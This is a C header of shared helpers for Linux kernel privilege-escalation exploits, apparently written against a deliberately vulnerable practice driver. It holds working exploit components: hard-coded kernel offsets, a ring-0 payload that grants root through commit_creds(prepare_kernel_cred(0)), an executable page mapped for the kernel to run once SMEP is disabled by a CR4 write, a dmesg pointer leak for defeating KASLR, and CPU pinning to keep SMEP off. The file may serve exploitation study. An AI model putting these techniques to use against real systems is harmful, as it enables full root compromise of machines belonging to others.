#ifndef _COMMON_
	#define _COMMON_

/* Compile these exploits with
gcc exploits/<exploit> -fno-inline -fPIC -no-pie
*/

#define PATH "/dev/vulnerable_device"
#define GREP_INFOLEAK "dmesg | grep SyS_ioctl+0x79 | awk '{print $3}' | cut -d '<' -f 2 | cut -d '>' -f 1 > /tmp/infoleak"
#define MMAP_ADDR 0x100000000000
#define MAP_SIZE 4096
#define CR4_WRITE_OFFSET 0x1CF149
#define PREPARE_CRED_OFFSET 0x18EC69
#define COMMIT_CREDS_OFFSET 0x18F059
#define TARGET_CR4 0x00000000000407f0

/**************************** Escalate privs prototypes *************************/
struct cred;
struct task_struct;

/* Definitions for commit_creds and prepare_kernel_cred */
typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));

typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

/**********************************************************************************/

/**
* Commit a new creds structure to our task struct
* run from ring 0 after EIP/RIP control is gained and
* SMEP is bypassed.
*/
void get_root()
{
	commit_creds(prepare_kernel_cred(0));
}

/**
* Sometimes copying get_root into a mapped page
* doesnt work, think this is due to compiler optimisations.
* Instead we copy this stub that in turn calls get_root.
* Also run from ring 0.
*/
void stub()
{
	asm("call *%0" : : "r"(get_root));
}

/**
* Take a null pointer and store in it a valid pointer
* to a newly mapped page. This page then holds our privesc
* payload. Once SMEP is disabled, this is then executed by
* the kernel.
*/
int map_and_copy(void *addr)
{

	addr = mmap((void *)MMAP_ADDR, MAP_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC,
				MAP_FIXED|MAP_ANON|MAP_PRIVATE, 0,0);

	if(addr == MAP_FAILED)
	{
		return -1;
	}

	memcpy(addr, get_root, 128);
	return 1;
}

/**
* This function greps the dmesg log for a pointer to sys_ioctl+0x79
* this obviously only works where dmesg_restrict = 0. I use this
* method in my examples to simplify the exploitation process to bypass
* kaslr. Alternatively, you could use the arbitrary read vuln in the driver
* to leak kernel pointers.
*/
long  get_info_leak()
{
	system(GREP_INFOLEAK);

	long addr = 0;
	FILE *fd = fopen("/tmp/infoleak", "r");

	fscanf(fd, "%lx", &addr);
	fclose(fd);
	return addr;
}

/**
* SMEP is only disabled on the core the process is running on
* at that time. If another core is given control of our process
* then SMEP will be enabled on it. Here we force our process to only
* run on a single core.
*/
void force_single_core()
{
	/* Force this process to run on a single core, the core we disable smep on */
	cpu_set_t  mask;
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);

	if(sched_setaffinity(0, sizeof(mask), &mask)) {
		printf("[x] Error setting affinity to core0, continuing anyway, exploit may fault [x]\n");
	}

}

#endif